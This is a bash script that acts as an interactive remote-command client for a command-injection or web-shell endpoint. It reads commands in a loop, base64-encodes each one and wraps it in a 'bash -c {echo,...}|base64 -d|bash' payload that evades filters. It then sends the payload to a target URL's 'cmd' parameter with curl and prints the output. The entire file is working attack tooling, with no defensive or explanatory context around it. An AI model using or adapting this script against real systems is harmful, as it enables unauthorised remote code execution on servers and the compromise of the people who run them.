usage()
{
  echo -ne \
    "First, edit the function send_payload.\n" \
    "usage: $0 -u TARGET_URL\n"   \
    "\techo test\n" \
    "\ttest\n"      \
    "\texit\n"
}

encode_command()
{
  echo $1 | base64 -w 0
}

build_payload()
{
  echo "bash -c {echo,$1}|base64 -d|bash"
}

# Edit this request
send_payload()
{
  raw=$(curl -s "$url" -G --data-urlencode "cmd=$payload")
  echo "$raw\\n" # Return the command output
}

execute_command()
{
  cmd=$1
  encoded_cmd=$(encode_command "$cmd")
  payload=$(build_payload "$encoded_cmd")
  response=$(send_payload "$payload")
  printf "$response"
}

better_shell()
{
  while :; do
    read -e command
    if [ "$command" == "exit" ]; then 
      break
    fi
    execute_command "$command"
  done
}

if [[ $# -eq 0 ]]; then
  usage
  exit 0
fi

while [ "$1" != "" ]; do
 case $1 in 
   -u | --url )   shift
                  url=$1
                  ;;
   -h | --help )  usage
                  exit
                  ;;
   * )            usage
                  exit 1
 esac
 shift
done

better_shell
